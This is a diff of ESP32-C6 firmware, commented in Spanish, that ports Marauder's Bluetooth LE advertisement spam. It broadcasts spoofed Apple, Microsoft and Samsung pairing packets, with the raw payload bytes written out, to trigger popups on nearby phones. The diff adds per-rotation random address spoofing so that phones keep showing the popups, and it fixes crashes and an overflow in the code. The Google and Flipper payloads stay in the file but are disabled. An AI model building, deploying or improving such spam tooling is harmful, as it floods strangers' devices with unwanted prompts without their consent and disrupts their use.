@@ -4,7 +4,6 @@
 #include <BLEDevice.h>
 #include <BLEAdvertising.h>
 #include <esp_random.h>
-#include <esp_mac.h>
 
 static const unsigned char image_Layer_9_bits[] PROGMEM = {
   0x7e,0x7e,0x7e,0x7e,0x99,0x99,0x99,0x99,
@@ -23,18 +22,27 @@ static const unsigned char image_Layer_9_bits[] PROGMEM = {
 //  cual los arma Marauder (Company ID + estructura de cada fabricante),
 //  no inventados. Rota de fabricante cada ROTATE_INTERVAL_MS.
 //
-//  MAC address: Marauder randomiza la MAC en CADA paquete via un ciclo
-//  completo BLEDevice::deinit(true) + init(). Se probo igual aca y
+//  Direccion BLE: Marauder randomiza la MAC en CADA paquete via
+//  esp_base_mac_addr_set() + un ciclo deinit/init. Eso se probo aca y
 //  crashea en hardware real (ESP32-C6, arduino-esp32 3.3.11) con
-//  "Guru Meditation Error / Store access fault" -- deinit(true) libera
-//  la memoria del controlador BT y el init() inmediato de vuelta no le
-//  da tiempo a NimBLE a terminar de destruirse (se ve tambien como
-//  "ble_store_config_write_local_irk rc=27" en el log serial). Por
-//  eso aca la MAC se randomiza una sola vez, al encender el spam (un
-//  solo init por sesion); la rotacion entre fabricantes solo cambia
-//  los datos del advertising sin tocar el stack BLE. Se pierde el
-//  "cada paquete es un dispositivo distinto" de Marauder, pero deja de
-//  crashear.
+//  "Guru Meditation Error / Store access fault" -- no es un problema
+//  de frecuencia ni de timing: crashea incluso llamando
+//  esp_base_mac_addr_set() una sola vez, antes del PRIMER init() de
+//  toda la sesion (se ve tambien como "ble_store_config_write_local_irk
+//  rc=27" / "ble_store_util_status_rr rc=17" en el log serial justo
+//  antes del panic). O sea: esp_base_mac_addr_set() en si mismo es
+//  incompatible con el almacenamiento de bonding/identidad de este
+//  puerto de NimBLE en este chip+core -- porque cambia la identidad
+//  DEL CHIP completo, de la que depende ese almacenamiento.
+//
+//  La solucion real: BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM) +
+//  BLEDevice::setOwnAddr(addr) en cada rotacion. Esto usa la API del
+//  HOST de NimBLE (ble_hs_id_set_rnd) para cambiar solo la direccion
+//  CON LA QUE SE ANUNCIA, sin tocar la identidad del chip ni el
+//  almacenamiento de bonding/IRK -- por eso no deberia repetir el
+//  crash. Si igual llega a crashear con esto, avisame y volvemos a
+//  sacar la randomizacion (como en la version anterior de este
+//  archivo, que solo usaba la MAC de fabrica fija).
 //
 //  OJO -- que quede claro que NO se porto todo Marauder: el tipo
 //  "Airtag" del codigo original (que hace que el celular de alguien
@@ -55,19 +63,43 @@ static const char* TYPE_NAMES[SPAM_TYPE_COUNT] = {
   "Apple", "Microsoft", "Samsung", "Google Fast Pair", "Flipper Zero"
 };
 
+// Google Fast Pair y Flipper Zero causaron "Stack smashing protect
+// failure!" en hardware real y estan desactivados por ahora hasta
+// diagnosticar bien la causa (ya no es un desborde de arreglo local --
+// se descarto a mano, byte por byte -- probablemente sea la pila del
+// task de loop() quedandose corta en esa parte del ciclo). El codigo
+// de sus payloads (addGooglePacket/addFlipperPacket) se deja intacto,
+// solo no se usa, para poder reactivarlos facil cuando se resuelva.
+// Microsoft (Swift Pair) nunca dio crash en las pruebas, asi que
+// rota junto con Apple/iOS y Samsung.
+static const SpamType ACTIVE_TYPES[] = { SPAM_APPLE, SPAM_MICROSOFT, SPAM_SAMSUNG };
+static const int ACTIVE_COUNT = sizeof(ACTIVE_TYPES) / sizeof(ACTIVE_TYPES[0]);
+
 static const unsigned long ROTATE_INTERVAL_MS = 1000; // Marauder throttlea "Sour Apple" a 1s
 
 static BLEAdvertising* pAdvertising = nullptr;
 static bool           spamming     = false;
 static int            currentType  = 0;
+static int            activeIndex  = 0;
 static unsigned long  lastRotate   = 0;
 static uint32_t       packetsSent  = 0;
 
 static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }
 
-static void generateRandomMac(uint8_t mac[6]) {
-  for (int i = 0; i < 6; i++) mac[i] = rnd8();
-  mac[0] = (mac[0] & 0xFC) | 0x02; // localmente administrada + unicast (bits estandar de una MAC BLE random)
+// Direccion BLE "static random" -- NO es lo mismo que randomizar la
+// MAC del chip con esp_base_mac_addr_set() (eso crasheaba, ver nota
+// arriba de todo el archivo). Esto usa BLEDevice::setOwnAddr(), que
+// llama a ble_hs_id_set_rnd() adentro de NimBLE: solo cambia la
+// direccion que se usa PARA anunciar, a nivel del host BLE, sin tocar
+// la identidad del chip ni el almacenamiento de bonding/IRK -- por
+// eso no deberia repetir el crash. Los dos bits mas significativos del
+// primer byte tienen que ser "11" para que sea una direccion random
+// "static" valida segun el spec de Bluetooth (evitar el error de
+// generateRandomMac() de la version anterior, que usaba la convencion
+// de Ethernet "localmente administrada" en vez de la de BLE).
+static void generateRandomAddr(uint8_t addr[6]) {
+  for (int i = 0; i < 6; i++) addr[i] = rnd8();
+  addr[0] |= 0xC0; // top 2 bits = 11 -> static random address valida
 }
 
 static void randomName(char* out, uint8_t len) {
@@ -78,20 +110,31 @@ static void randomName(char* out, uint8_t len) {
 
 // ---------- Payloads (bytes tal cual Marauder, GetUniversalAdvertisementData) ----------
 
+// NOTA sobre "static" en los arreglos de abajo -- no es por reentrancia
+// (estas funciones se llaman una sola vez por rotacion, nunca en
+// paralelo), es para que los buffers vivan en .bss en vez de la pila.
+// Cada rotacion ya viene de una cadena de llamadas bastante profunda
+// (loop -> screenBtSpamLoop -> applyPacket -> addXPacket -> NimBLE
+// host), y el task de loop() en el ESP32-C6 no tiene un stack enorme;
+// sacar estos arreglos de la pila reduce el uso de stack en el punto
+// mas profundo de esa cadena. Ademas cada addData() ahora manda el
+// conteo real de bytes escritos (variable i/total), nunca sizeof(raw),
+// para que el tamano fisico del arreglo nunca pueda desincronizarse
+// del payload realmente armado.
 static void addApplePacket(BLEAdvertisementData &adv) {
   if (rnd8() % 10 != 0) {
     // "Accion" (Handoff/AirDrop) -- popup mas chico y rapido
-    uint8_t raw[11];
+    static uint8_t raw[11];
     int i = 0;
     raw[i++] = 0x0A; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
     raw[i++] = 0x0F; raw[i++] = 0x05; raw[i++] = 0xC0;
     static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
     raw[i++] = types[rnd8() % (sizeof(types))];
     raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
-    adv.addData((char*)raw, sizeof(raw));
+    adv.addData((char*)raw, i);
   } else {
     // "Dispositivo" (AirPods/Watch/etc) -- el cartel grande de "Conectar"
-    uint8_t raw[21];
+    static uint8_t raw[21];
     int i = 0;
     raw[i++] = 0x14; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
     raw[i++] = 0x07; raw[i++] = 0x0F; raw[i++] = 0x00;
@@ -105,15 +148,15 @@ static void addApplePacket(BLEAdvertisementData &adv) {
     raw[i++] = 0xAC; raw[i++] = 0x90; raw[i++] = 0x85; raw[i++] = 0x75; raw[i++] = 0x94; raw[i++] = 0x65;
     raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
     raw[i++] = 0x00;
-    adv.addData((char*)raw, sizeof(raw));
+    adv.addData((char*)raw, i);
   }
 }
 
 static void addMicrosoftPacket(BLEAdvertisementData &adv) {
-  char name[6];
+  static char name[6];
   randomName(name, 5);
   uint8_t total = 7 + 5;
-  uint8_t raw[12];
+  static uint8_t raw[12];
   int i = 0;
   raw[i++] = total - 1;
   raw[i++] = 0xFF; raw[i++] = 0x06; raw[i++] = 0x00; raw[i++] = 0x03; raw[i++] = 0x00; raw[i++] = 0x80;
@@ -123,30 +166,35 @@ static void addMicrosoftPacket(BLEAdvertisementData &adv) {
 }
 
 static void addSamsungPacket(BLEAdvertisementData &adv) {
-  uint8_t raw[15];
+  static uint8_t raw[15];
   int i = 0;
   raw[i++] = 14; raw[i++] = 0xFF; raw[i++] = 0x75; raw[i++] = 0x00;
   raw[i++] = 0x01; raw[i++] = 0x00; raw[i++] = 0x02; raw[i++] = 0x00; raw[i++] = 0x01;
   raw[i++] = 0x01; raw[i++] = 0xFF; raw[i++] = 0x00; raw[i++] = 0x00; raw[i++] = 0x43;
   raw[i++] = rnd8(); // "modelo/color" -- Marauder usa una tabla real de watch models, aca va random
-  adv.addData((char*)raw, sizeof(raw));
+  adv.addData((char*)raw, i);
 }
 
 static void addGooglePacket(BLEAdvertisementData &adv) {
-  uint8_t raw[14];
+  static uint8_t raw[14];
   int i = 0;
   raw[i++] = 3; raw[i++] = 0x03; raw[i++] = 0x2C; raw[i++] = 0xFE;
   raw[i++] = 6; raw[i++] = 0x16; raw[i++] = 0x2C; raw[i++] = 0xFE;
   raw[i++] = 0x00; raw[i++] = 0xB7; raw[i++] = 0x27;
   raw[i++] = 2; raw[i++] = 0x0A;
   raw[i++] = (uint8_t)((rnd8() % 120) - 100); // -100 a +19 dBm, TX power falso
-  adv.addData((char*)raw, sizeof(raw));
+  adv.addData((char*)raw, i);
 }
 
 static void addFlipperPacket(BLEAdvertisementData &adv) {
-  char name[6];
+  static char name[6];
   randomName(name, 5);
-  uint8_t raw[24];
+  // OJO: son 27 bytes en total (5 campos fijos de cabecera + 5 del
+  // nombre + 17 mas de payload), NO 24 -- con raw[24] esto escribia
+  // 3 bytes pasado el final del arreglo y tronaba con
+  // "Stack smashing protect failure!" en hardware real apenas la
+  // rotacion llegaba a Flipper (ultimo tipo del ciclo).
+  static uint8_t raw[27];
   int i = 0;
   raw[i++] = 0x02; raw[i++] = 0x01; raw[i++] = 0x06;
   raw[i++] = 0x06; raw[i++] = 0x09;
@@ -161,20 +209,33 @@ static void addFlipperPacket(BLEAdvertisementData &adv) {
 
 // ---------- Emitir un paquete (sin tocar el stack BLE) ----------
 
-// IMPORTANTE -- version anterior de esto hacia un ciclo completo
-// BLEDevice::deinit(true) + init() en CADA rotacion (cada 1s) para que
-// cada paquete saliera con una MAC nueva, tal como hace Marauder. En
-// hardware real (ESP32-C6, arduino-esp32 3.3.11) eso crashea con
-// "Guru Meditation Error / Store access fault" -- deinit(true) libera
-// la memoria del controlador BT y un init() inmediato despues no le da
-// tiempo a NimBLE a terminar de destruirse antes de volver a armarse
-// (se ve tambien como "ble_store_config_write_local_irk rc=27" en el
-// log). Asi que el diseno cambio: la MAC se randomiza UNA vez al
-// encender el spam (un solo init), y la rotacion entre fabricantes
-// solo cambia los datos del advertising sin tocar el stack. Se pierde
-// el "cada paquete es un dispositivo distinto" de Marauder, pero deja
-// de crashear.
+// La rotacion entre fabricantes solo cambia los datos del advertising
+// (stop + setAdvertisementData + start), sin volver a inicializar el
+// stack BLE -- eso es seguro hacer en caliente. Ahora SI se randomiza
+// la direccion en cada llamada (ver generateRandomAddr arriba), via
+// BLEDevice::setOwnAddr() -- eso es lo que hace que el celular vea
+// "un dispositivo nuevo" en cada rotacion y vuelva a mostrar el popup,
+// en vez de cachear siempre la misma direccion y dejar de avisar.
 static void applyPacket(int type) {
+  // Esperar a que el advertising anterior haya terminado del todo antes
+  // de cambiar de direccion. pAdvertising->stop() (llamado por quien
+  // invoca applyPacket en cada rotacion) puede devolver exito antes de
+  // que el controlador confirme el stop, y NimBLE rechaza
+  // ble_hs_id_set_rnd() (adentro de setOwnAddr) con EBUSY si todavia ve
+  // advertising activo -- eso es lo que daba "setOwnAddr fallo" en casi
+  // todas las rotaciones despues de la primera. Timeout corto (50ms)
+  // para no trabarse si algo raro pasa.
+  unsigned long waitStart = millis();
+  while (pAdvertising->isAdvertising() && millis() - waitStart < 50) {
+    delay(1);
+  }
+
+  uint8_t addr[6];
+  generateRandomAddr(addr);
+  if (!BLEDevice::setOwnAddr(addr)) {
+    Serial.println(F("BT Spam: setOwnAddr fallo, se sigue con la direccion anterior"));
+  }
+
   BLEAdvertisementData advData;
   switch (type) {
     case SPAM_APPLE:     addApplePacket(advData);     break;
@@ -192,10 +253,6 @@ static void applyPacket(int type) {
 static void startSpam() {
   if (spamming) return;
 
-  uint8_t mac[6];
-  generateRandomMac(mac);
-  esp_base_mac_addr_set(mac); // solo se aplica en el init() de abajo
-
   // El radio 2.4GHz es compartido entre WiFi y BLE en este chip: si
   // quedo algo de WiFi encendido de otra pantalla, se apaga aqui para
   // no pelear con el controlador de BLE.
@@ -205,7 +262,17 @@ static void startSpam() {
   pAdvertising = BLEDevice::getAdvertising();
   pAdvertising->setScanResponse(false);
 
-  currentType = 0;
+  // BLE_OWN_ADDR_RANDOM: le dice al host que use la direccion random
+  // que le pasemos con setOwnAddr(), no la MAC publica del chip. Esto
+  // no toca esp_base_mac_addr_set ni la identidad del chip -- por eso
+  // no deberia repetir el "Guru Meditation / Store access fault" que
+  // dio esp_base_mac_addr_set (ver nota arriba de todo el archivo).
+  if (!BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)) {
+    Serial.println(F("BT Spam: setOwnAddrType fallo, se sigue con la MAC publica"));
+  }
+
+  activeIndex = 0;
+  currentType = ACTIVE_TYPES[activeIndex];
   applyPacket(currentType);
 
   spamming    = true;
@@ -269,7 +336,8 @@ void screenBtSpamLoop() {
   if (spamming && millis() - lastRotate >= ROTATE_INTERVAL_MS) {
     lastRotate = millis();
     pAdvertising->stop();
-    currentType = (currentType + 1) % SPAM_TYPE_COUNT;
+    activeIndex = (activeIndex + 1) % ACTIVE_COUNT;
+    currentType = ACTIVE_TYPES[activeIndex];
     applyPacket(currentType);
   }
 
